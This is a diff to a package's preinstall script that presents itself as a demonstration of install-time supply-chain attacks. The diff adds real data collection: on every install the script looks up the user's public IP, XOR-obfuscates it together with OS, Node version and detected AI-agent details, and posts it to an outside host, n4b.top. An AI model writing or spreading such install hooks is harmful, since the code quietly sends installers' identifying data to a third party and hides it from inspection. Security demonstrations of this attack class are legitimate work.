@@ -4,7 +4,7 @@
  * Lives at: https://github.com/daltsubnet/bun-install-helloworld-demo
  *
  * Triggered by: bun/npm install of this package (preinstall).
- * Owns: attack narrative + UUIDv7 telemetry ping + download count.
+ * Owns: attack narrative + UUIDv7 telemetry (XOR+IP) + download count.
  *
  * Does NOT download Bun binaries or run obfuscated payloads.
  */
@@ -26,6 +26,8 @@ const PKG = "bun-install-helloworld-demo";
 const DEMO_URL = "https://github.com/daltsubnet/bun-install-helloworld-demo";
 const TELEMETRY_URL = "https://n4b.top/check-ai";
 const TELEMETRY_COUNT = `${TELEMETRY_URL}/count?repo=${encodeURIComponent(PKG)}`;
+/** Shared XOR key with n4b.top /check-ai (demo obfuscation only — not real crypto). */
+const XOR_KEY = "XXXXX";
 
 const RED = "\x1b[31m";
 const YELLOW = "\x1b[33m";
@@ -114,6 +116,32 @@ function detectAgent() {
   return "none";
 }
 
+function xorBuf(buf, key) {
+  const k = Buffer.from(key, "utf8");
+  const out = Buffer.allocUnsafe(buf.length);
+  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ k[i % k.length];
+  return out;
+}
+
+/** JSON → XOR(XXXXX) → base64 (wire format). */
+function xorEncodeJson(obj) {
+  return xorBuf(Buffer.from(JSON.stringify(obj), "utf8"), XOR_KEY).toString(
+    "base64",
+  );
+}
+
+async function publicIp() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json", {
+      signal: AbortSignal.timeout(3000),
+    });
+    const j = await res.json();
+    return String(j.ip || "").slice(0, 64);
+  } catch {
+    return "";
+  }
+}
+
 async function pingTelemetry() {
   let v = "1.0.0";
   try {
@@ -122,24 +150,27 @@ async function pingTelemetry() {
     /* ignore */
   }
   const id = installId();
+  const ip = await publicIp();
+  const payload = {
+    id,
+    repo: PKG,
+    agent: detectAgent(),
+    v,
+    node: process.versions.node,
+    os: platform(),
+    ip,
+  };
   try {
     await fetch(TELEMETRY_URL, {
       method: "POST",
       headers: { "content-type": "application/json" },
-      body: JSON.stringify({
-        id,
-        repo: PKG,
-        agent: detectAgent(),
-        v,
-        node: process.versions.node,
-        os: platform(),
-      }),
-      signal: AbortSignal.timeout(4000),
+      body: JSON.stringify({ enc: xorEncodeJson(payload) }),
+      signal: AbortSignal.timeout(5000),
     });
   } catch {
     /* ignore offline */
   }
-  return id;
+  return { id, ip };
 }
 
 async function fetchDownloadCount() {
@@ -199,14 +230,17 @@ blocked("Obfuscated / Base91 payload is intentionally absent.");
 
 step(
   4,
-  "Telemetry beacon (UUIDv7) + download count",
-  `${TELEMETRY_URL} / ${TELEMETRY_COUNT}`,
+  "Telemetry beacon (IP + XOR/XXXXX + UUIDv7) + download count",
+  `${TELEMETRY_URL} body.enc = base64(XOR(JSON))`,
 );
-const id = await pingTelemetry();
+const { id, ip } = await pingTelemetry();
 const count = await fetchDownloadCount();
 ok(`install-id: ${id}`);
+ok(`public-ip: ${ip || "(unavailable)"}`);
 if (count) {
-  ok(`download count: total=${count.total ?? "?"} unique=${count.unique ?? "?"}`);
+  ok(
+    `download count: total=${count.total ?? "?"} unique=${count.unique ?? "?"}`,
+  );
 } else {
   warn("download count unavailable (offline?)");
 }
@@ -229,7 +263,7 @@ console.log(
   `  ${BOLD}3.${RESET} GitHub-as-registry: bun/npm add ${DEMO_URL} still runs preinstall.`,
 );
 console.log(
-  `  ${BOLD}4.${RESET} Beacon: preinstall phones home (UUIDv7) to count installs.`,
+  `  ${BOLD}4.${RESET} Beacon: preinstall phones home (XOR+IP+UUIDv7) to count installs.`,
 );
 console.log(
   `  ${BOLD}5.${RESET} Cleanup: temp wipe erases easy IOCs after the payload already ran.`,
